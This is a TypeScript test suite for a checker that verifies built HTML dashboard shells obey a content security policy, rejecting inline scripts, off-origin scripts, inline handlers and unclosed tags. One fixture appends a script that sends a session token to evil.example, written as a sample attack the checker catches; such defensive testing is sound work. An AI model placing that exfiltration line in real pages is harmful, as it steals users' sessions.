import { rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import process from 'node:process'
import { describe, expect, test } from 'bun:test'
import { checkShell, checkShells } from './check-dashboard-csp'

/** The shape `vite build` emits today: one external module script, one stylesheet. */
const BUILT_SHELL = `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Honmoon</title>
    <script type="module" crossorigin src="/assets/index-ChyO-qsg.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-t0vyplZE.css">
  </head>
  <body>
    <div id="root"></div>
  </body>
</html>
`

/** What `apps/dashboard/demo/build.ts` adds: one relative, same-origin shim tag. */
const DEMO_SHELL = BUILT_SHELL.replace(
  '<script type="module"',
  '<script src="./demo-mode.js"></script>\n    <script type="module"',
)

function details(html: string): string[] {
  return checkShell(html, 'shell').map(problem => problem.detail)
}

describe('checkShell', () => {
  test('the shells the repo actually builds pass', () => {
    expect(checkShell(BUILT_SHELL, 'dist')).toEqual([])
    expect(checkShell(DEMO_SHELL, 'dist-demo')).toEqual([])
  })

  test('an inline <script> body fails — script-src \'self\' refuses it', () => {
    const inlined = BUILT_SHELL.replace(
      '<div id="root"></div>',
      '<div id="root"></div>\n    <script>window.__x = 1</script>',
    )
    expect(details(inlined)).toEqual([
      expect.stringContaining('inline <script> body'),
      expect.stringContaining('<script> with no src'),
    ])
  })

  test('a script from another origin fails', () => {
    const cdn = BUILT_SHELL.replace('/assets/index-ChyO-qsg.js', 'https://cdn.example/app.js')
    expect(details(cdn)).toEqual([expect.stringContaining('off this origin')])
  })

  // The placeholder `crates/honmoon-mgmt/build.rs` writes so a bare `cargo build`
  // works without a dashboard satisfies every other rule vacuously.
  test('a shell with no script at all fails rather than passing vacuously', () => {
    expect(details('<!doctype html><html><body><p>Dashboard not built.</p></body></html>'))
      .toEqual([expect.stringContaining('not a built dashboard shell')])
  })

  test('an inline handler, a <base> and a <form> each fail', () => {
    expect(details(BUILT_SHELL.replace('<div id="root">', '<div onclick="go()" id="root">')))
      .toEqual([expect.stringContaining('inline event handler')])
    expect(details(BUILT_SHELL.replace('<title>', '<base href="/x/" /><title>')))
      .toEqual([expect.stringContaining('<base>')])
    expect(details(BUILT_SHELL.replace('<div id="root"></div>', '<form action="/x"></form>')))
      .toEqual([expect.stringContaining('<form>')])
  })

  // The pair regex is lazy: it skips an opening tag with no `</script>` after
  // it. Before this case existed, an appended unclosed script passed clean while
  // an earlier well-formed tag kept the count non-zero — a silent pass in the
  // one check whose purpose is to not have one.
  test('an unclosed trailing <script> fails rather than going uninspected', () => {
    const appended = `${BUILT_SHELL}<script>\n  fetch('https://evil.example/?c=' + sessionStorage.getItem('honmoon_session'))\n`
    expect(details(appended)).toEqual([expect.stringContaining('no readable `</script>`')])
  })

  // HTML does not honour `<script/>` as self-closing, so its content would run.
  test('a self-closed <script/> is reported as unreadable, not as an unbuilt shell', () => {
    expect(details('<script src="/a.js" />')).toEqual([
      expect.stringContaining('no readable `</script>`'),
    ])
  })

  test('an unquoted inline handler fails — HTML does not require the quotes', () => {
    expect(details(BUILT_SHELL.replace('<div id="root">', '<div onclick=go() id="root">')))
      .toEqual([expect.stringContaining('inline event handler')])
  })

  test('a fragment link is same-document, not an off-origin load', () => {
    expect(details(BUILT_SHELL.replace('<div id="root">', '<a href="#/audit">a</a><div id="root">')))
      .toEqual([])
  })
})

describe('checkShells', () => {
  // `join(REPO_ROOT, '/abs/path')` grafts the argument onto the root and then
  // reports "not found", which reads as a missing build rather than a misread
  // path. The script's own usage line invites an absolute argument.
  test('an absolute path is read as given, not grafted onto the repository root', () => {
    const absolute = join(tmpdir(), `honmoon-csp-shell-${process.pid}.html`)
    writeFileSync(absolute, BUILT_SHELL)
    try {
      expect(checkShells([absolute])).toEqual([])
    }
    finally {
      rmSync(absolute, { force: true })
    }
  })

  test('a missing artifact fails rather than being skipped', () => {
    expect(checkShells(['apps/dashboard/dist/no-such-shell.html']))
      .toEqual([{ shell: 'apps/dashboard/dist/no-such-shell.html', detail: expect.stringContaining('not found') }])
  })
})
